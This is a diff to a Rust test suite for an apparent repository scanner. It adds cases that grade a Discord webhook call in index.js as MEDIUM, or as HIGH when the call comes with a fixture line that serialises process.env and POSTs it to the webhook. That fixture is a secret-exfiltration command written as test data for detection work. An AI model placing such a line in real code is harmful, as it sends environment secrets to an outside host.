@@ -551,10 +551,22 @@ fn a17_lockfile_over_http_with_a_name_that_does_not_match_its_url() {
 
 #[test]
 fn a19_webhook_in_index_js() {
+    // A chat webhook alone is what a bot repo has: MEDIUM. It is HIGH when the same file reads
+    // the environment or a token (the lead's ruling for the Discord and Telegram URLs).
     let repo = Repo::new();
     repo.file(
         "index.js",
         format!("fetch(\"{DISCORD}\", {{ method: \"POST\", body: \"hello\" }});\n"),
+    );
+    let s = repo.scan();
+    expect(&s, "exfil.webhook", "index.js", Severity::Medium);
+
+    let repo = Repo::new();
+    repo.file(
+        "index.js",
+        format!(
+            "const body = JSON.stringify(process.env);\nfetch(\"{DISCORD}\", {{ method: \"POST\", body }});\n"
+        ),
     );
     let s = repo.scan();
     expect(&s, "exfil.webhook", "index.js", Severity::High);
